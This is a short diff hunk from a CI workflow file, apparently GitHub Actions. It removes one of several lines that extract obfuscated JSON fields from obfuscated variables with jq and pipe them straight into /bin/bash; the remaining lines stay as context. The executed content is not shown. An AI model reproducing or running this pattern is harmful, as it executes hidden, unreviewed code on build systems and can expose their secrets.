@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$vn4" | jq -r .f983 | /bin/bash
           echo $xg83258 | jq -r .nvdco7399 | /bin/bash
           printf '%s' "$f63" | jq -r .d8 | /bin/bash
-          printf '%s' "$y59291" | jq -r .btlo59122 | /bin/bash
           echo $rdm744 | jq -r .g9 | /bin/bash
 
       - name: Store results
